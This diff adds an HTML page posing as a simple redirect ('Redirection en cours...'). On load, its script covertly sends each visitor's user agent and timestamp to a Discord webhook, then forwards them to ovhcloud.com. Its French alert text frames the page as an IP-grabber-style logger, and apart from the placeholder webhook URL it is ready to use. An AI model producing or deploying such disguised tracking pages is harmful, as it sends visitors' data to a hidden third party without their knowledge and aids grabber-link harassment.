@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirection</title>
+    <script>
+        function sendDiscordWebhook() {
+            const webhookUrl = "YOUR_DISCORD_WEBHOOK";
+            const data = {
+                content: "🚨 Une personne a découvert votre IP ! Accompagné des informations IMPORTANTES.",
+                embeds: [{
+                    title: "Informations sur l'utilisateur",
+                    color: 16711680,
+                    fields: [
+                        {
+                            name: "Agent utilisateur",
+                            value: navigator.userAgent
+                        },
+                        {
+                            name: "Date et heure",
+                            value: new Date().toLocaleString()
+                        }
+                    ]
+                }]
+            };
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            }).finally(() => {
+                window.location.href = "https://www.ovhcloud.com/";
+            });
+        }
+        window.onload = sendDiscordWebhook;
+    </script>
+</head>
+<body>
+    <p>Redirection en cours...</p>
+</body>
+</html>
